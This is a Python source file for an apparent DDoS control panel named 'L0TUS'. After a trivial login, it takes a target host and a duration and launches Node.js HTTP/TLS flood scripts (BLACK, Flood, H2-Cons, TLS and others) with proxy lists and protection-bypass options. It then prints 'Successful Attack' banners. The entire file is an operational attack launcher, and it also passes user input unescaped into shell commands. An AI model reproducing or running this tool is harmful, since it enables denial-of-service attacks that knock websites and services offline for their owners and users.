# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

def help():
	os.system ("clear")
	print("""
\033[34m      :::        :::::::\033[38m ::::::::::: :::    :::  ::::::::
\033[34m     :+:       :+:   :+:\033[38m    :+:     :+:    :+: :+:    :+:
\033[34m    +:+       +:+   +:+ \033[38m   +:+     +:+    +:+ +:+
\033[34m   +#+       +#+   +:+  \033[38m  +#+     +#+    +:+ +#++:++#++
\033[34m  +#+       +#+   +#+   \033[38m +#+     +#+    +#+        +#+
\033[34m #+#       #+#   #+#    \033[38m#+#     #+#    #+# #+#    #+#
\033[34m########## #######      \033[38m###     ########   ########

\033[36m
    NAME         DESCRIPTION      DURATION
╔═══════════╬═══════════════════╬═══════════╗
   BLACK            LAYER7           120
   Flood            LAYER7           120
   H2-Cons          LAYER7           120
   HTTP             LAYER7           120
   Pluto            LAYER7           120
   Strike           LAYER7           120
   TLS              LAYER7           120
   TLS1             LAYER7           120
   TLS2             LAYER7           120
   TLSCLF           LAYER7           120
╚═══════════════════════════════════════════╝

""")

def menu():
    os.system ("clear")
    print("""
\033[34m      :::        :::::::\033[34m ::::::::::: :::    :::  ::::::::
\033[34m     :+:       :+:   :+:\033[34m    :+:     :+:    :+: :+:    :+:
\033[34m    +:+       +:+   +:+ \033[34m   +:+     +:+    +:+ +:+
\033[34m   +#+       +#+   +:+  \033[34m  +#+     +#+    +:+ +#++:++#++
\033[34m  +#+       +#+   +#+   \033[34m +#+     +#+    +#+        +#+
\033[34m #+#       #+#   #+#    \033[34m#+#     #+#    #+# #+#    #+#
\033[34m########## #######      \033[34m###     ########   ########


\x1b[1;36mᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴍᴇᴛʜᴏᴅs.
""")



def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] L0TUS Pannel :: Server Online 1 :: Online 1 :: Running: 0/10\x07")
		sin = input("\033[0;30;0m\x1b[1;0m\033[0m~# \x1b[1;0m\033[0m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls" or sinput == "CLS":
			os.system ("pkill screen")
			os.system ("clear")
			menu()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			menu()			
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########LAYER-7########  
		elif sinput == "black" or sinput == "BLACK":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node BLACK.js {host} {time} 5 proxy.txt 32 uam')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                   TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                   TIME     : \033[36m[ \033[36m{time} \033[36m]
\033[36m                   LAYER-7  : \033[36m[ \033[36mAQUNET \033[36m]
\033[36m                   VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "flood" or sinput == "Flood":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node Flood.js {host} {time} 32 5 proxy.txt')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                   TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                   TIME     : \033[36m[\033[36m{time} \033[36m]
\033[36m                   LAYER-7  : \033[36m[ \033[36mTLS \033[36m]
\033[36m                   VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "h2-cons" or sinput == "H2-Cons":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node H2-Cons.js {host} {time} 32 5')
				os.system ("clear")
				print(f"""
\033[36m                           Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                   TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                   TIME     : \033[36m[ \033[36m{time} \033[36m]
\033[36m                   LAYER-7  : \033[36m[ \033[36mBYPASS \033[36m]
\033[36m                   VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "http" or sinput == "HTTP":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node HTTP.js {host} {time} 32 5 proxy.txt')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                   TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                   TIME     : \033[36m[ \033[36m{time} \033[36m]
\033[36m                   LAYER-7  : \033[36m[ \033[36mFLOOD \033[36m]
\033[36m                   VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "pluto" or sinput == "Pluto":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node Pluto.js {host} {time} 32 5 proxy.txt')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                   TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                   TIME     : \033[36m[ \033[36m{time} \033[36m]
\033[36m                   LAYER-7  : \033[36m[ \033[36mMIX \033[36m]
\033[36m                   VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "strike" or sinput == "Strike":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node Strike.js {host} {time} 32 5 proxy.txt')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                   TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                   TIME     : \033[36m[ \033[36m{time} \033[36m]
\033[36m                   LAYER-7  : \033[36m[ \033[36mHTTP \033[36m]
\033[36m                   VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls" or sinput == "TLS":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node TLS.js {host} {time} 32 5')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                   TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                   TIME     : \033[36m[ \033[36m{time} \033[36m]
\033[36m                   LAYER-7  : \033[36m[ \033[36mLOTUS \033[36m]
\033[36m                   VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls1" or sinput == "TLS1":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node TLS1.js {host} {time} 32 proxy.txt 5')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                TIME     : \033[36m[ \033[36m{time} \033[36m]
\033[36m                LAYER-7  : \033[36m[ \033[36mKILNET \033[36m]
\033[36m                VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls2" or sinput == "TLS2":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'node TLS2.js {host} {time} 32 5 proxy.txt')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                TARGET   : \033[36m[ \033[36m{host} \033[36m]
\033[36m                TIME     : \033[36m[ \033[36m{time} \033[36m]
\033[36m                LAYER-7  : \033[36m[ \033[36mTLS2 \033[36m]
\033[36m                VIP      : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlsclf" or sinput == "TLSCLF":
			try:
				host = sin.split()[1]
				time = sin.split()[3]
				os.system(f'node TLSCLF.js {host} {time} 32 5 proxy.txt')
				os.system ("clear")
				print(f"""
\033[36m                            Successful Attack!!!!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[36m                TARGET    : \033[36m[ \033[36m{host} \033[36m]
\033[36m                TIME      : \033[36m[ \033[36m{time} \033[36m]
\033[36m                LAYER-7   : \033[36m[ \033[36mRAPID \033[36m]
\033[36m                VIP       : \033[36m[ \033[36mTrue \033[36m]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 
def login():
    os.system("clear")
    user = ""
    passwd = ""
    username = input("""





    
                
                           ⚡ \33[0;36mLOGIN TO L0TUS-PANNEL : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;36mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""        
                              ☠️ \033[1;36mBUY YA!!!🚫""")
        time.sleep(0.4)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;38mWELLCOME TO L0TUS panel""")
        time.sleep(0.1)
    menu()
    main()
    

login()
